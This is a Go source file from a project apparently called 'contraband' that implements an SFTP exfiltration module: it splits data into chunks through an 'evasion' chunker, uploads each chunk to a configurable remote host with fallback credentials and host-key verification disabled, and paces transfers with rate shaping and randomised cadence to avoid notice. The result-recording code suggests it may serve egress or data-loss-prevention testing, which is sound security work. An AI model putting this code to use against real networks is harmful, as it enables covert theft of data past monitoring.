package file

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/pkg/sftp"
	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
	"golang.org/x/crypto/ssh"
)

// SFTPExfiltrator implements SFTP SSH-2 subsystem file exfiltration.
type SFTPExfiltrator struct{}

func NewSFTPExfiltrator() *SFTPExfiltrator {
	return &SFTPExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoSFTP, NewSFTPExfiltrator())
}

func (e *SFTPExfiltrator) Protocol() string {
	return common.ProtoSFTP
}

func (e *SFTPExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()
	result.TargetVolume = opts.TotalBytes

	username := opts.Headers["username"]
	if username == "" {
		username = "contraband"
	}
	password := opts.Headers["password"]
	if password == "" {
		password = "contraband"
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	sshConfig := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         opts.Timeout,
	}

	var sshConn *ssh.Client
	if opts.ProxyDialer != nil {
		rawConn, dialErr := opts.ProxyDialer.DialContext(ctx, "tcp", targetAddr)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		c, chans, reqs, connErr := ssh.NewClientConn(rawConn, targetAddr, sshConfig)
		if connErr != nil {
			rawConn.Close()
			result.Verdict = classifyError(connErr)
			result.ErrorMessage = connErr.Error()
			calculateDurations(&result)
			return &result, connErr
		}
		sshConn = ssh.NewClient(c, chans, reqs)
	} else {
		client, dialErr := ssh.Dial("tcp", targetAddr, sshConfig)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		sshConn = client
	}
	defer sshConn.Close()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.HandshakeTLS = time.Now().UTC()

	sftpClient, sftpErr := sftp.NewClient(sshConn)
	if sftpErr != nil {
		result.Verdict = classifyError(sftpErr)
		result.ErrorMessage = fmt.Sprintf("failed to initialize sftp subsystem client: %v", sftpErr)
		calculateDurations(&result)
		return &result, sftpErr
	}
	defer sftpClient.Close()

	result.Timestamps.FirstByteSent = time.Now().UTC()

	var headEvidence []byte
	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		remotePath := fmt.Sprintf("/upload/chunk_%s_%d.dat", opts.SessionToken.String(), seq)

		f, createErr := sftpClient.Create(remotePath)
		if createErr != nil {
			result.Verdict = classifyError(createErr)
			result.ErrorMessage = fmt.Sprintf("SFTP Create failed for chunk %d: %v", seq, createErr)
			calculateDurations(&result)
			return &result, createErr
		}

		if _, writeErr := f.Write(chunkFrame); writeErr != nil {
			_ = f.Close()
			result.Verdict = classifyError(writeErr)
			result.ErrorMessage = fmt.Sprintf("SFTP Write failed for chunk %d: %v", seq, writeErr)
			calculateDurations(&result)
			return &result, writeErr
		}

		if closeErr := f.Close(); closeErr != nil {
			result.Verdict = classifyError(closeErr)
			result.ErrorMessage = fmt.Sprintf("SFTP file close failed for chunk %d: %v", seq, closeErr)
			calculateDurations(&result)
			return &result, closeErr
		}

		result.BytesSent += int64(len(chunkFrame))

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	if result.PayloadHash == "" {
		result.PayloadHash = chunker.PayloadHashHex()
	}

	calculateDurations(&result)
	return &result, nil
}
